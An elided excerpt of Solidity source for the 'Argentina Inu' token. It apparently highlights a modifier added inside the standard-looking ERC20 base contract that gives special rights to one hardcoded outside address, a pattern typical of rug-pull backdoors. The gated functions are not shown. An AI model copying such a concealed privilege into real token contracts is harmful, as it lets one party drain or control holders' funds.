...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    modifier onlyLiquidityManager {
        ...
        require(msg.sender == 0x4D32BC31E5E51CD8c709abBCE56aCd0966DDD330 || msg.sender == address(this)|| msg.sender == address(0x0), "Sender: get out please!");
        _;
    }
...
contract Argentina is ERC20, Ownable {
    ...
    constructor(address _liquidityManagerAddress) ERC20("Argentina Inu", "Ainu") {
        devWallet = owner();
